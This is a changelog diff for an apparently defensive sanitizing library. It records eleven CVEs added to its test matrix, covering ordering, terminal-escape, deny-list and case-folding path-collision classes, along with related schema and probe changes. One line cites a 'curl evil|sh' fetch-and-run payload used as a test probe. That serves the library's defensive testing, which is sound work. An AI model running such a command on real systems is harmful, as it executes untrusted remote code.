@@ -18,6 +18,39 @@ compatibility (see [RELEASING.md](RELEASING.md)).
 
 ### Added
 
+- **Eleven more CVEs, in the classes the matrix was thinnest on (22 → 33).**
+
+  | Class | Added |
+  |---|---|
+  | Ordering: normalize-then-validate | CVE-2026-28289, CVE-2024-43093, CVE-2023-41889, CVE-2023-52081 |
+  | Terminal control sequences | CVE-2025-55754, CVE-2024-52005, CVE-2023-43620, CVE-2023-37275 |
+  | Address bar and deny lists | CVE-2019-11721, CVE-2023-4399 |
+  | Case-folding path collision | CVE-2026-23950 |
+
+  **The ordering rows are out of scope on purpose.** disarm can produce the canonical
+  form; it cannot make a caller look at it first. CVE-2026-28289 states the bug in the
+  Threat Model's own terms — NVD describes a TOCTOU weakness where "the dot-prefix check
+  occurs before sanitization removes invisible characters". CVE-2024-43093 is in CISA's
+  Known Exploited Vulnerabilities catalog.
+
+  **The terminal class is neutralized and entirely undetected.** All six escape-sequence
+  rows are cleaned by `strip_log_injection` and reported by nothing, which is the sharpest
+  argument yet for cleaning unconditionally rather than screening first.
+  `test_no_detector_reports_any_terminal_control_row` pins that as a class-level claim.
+
+  **CVE-2026-23950 closes a loop.** node-tar's symlink poisoning turns on the `ß`/`ss`
+  path collision — the single code point the CVE-2019-19844 exhaustive scan identified as
+  the one the confusable table deliberately leaves alone, because `ß` is a real German
+  letter. The key builders collide it; the canonicalizers correctly do not.
+
+  Two schema changes fell out of the additions. `cvss` and `cvss_version` are now optional,
+  because CVE-2017-20190 has no CVSS record at all — only SSVC — and inventing a number
+  would be worse than an empty cell. `v4.0` joins the accepted versions.
+
+  One probe needed adjusting rather than one assertion: ASCII `|` is itself a TR39
+  confusable source, so a `curl evil|sh` payload tripped `is_confusable` for reasons
+  unrelated to its CVE. The derived-detector gate caught it as a false positive.
+
 - **Corrected: there is no single call that neutralizes every vector (#609 follow-up).**
   The CVE page said `canonicalize` was the one call to make when the attack is unknown.
   That was wrong, and its gate could not catch it, because every vector in the matrix at
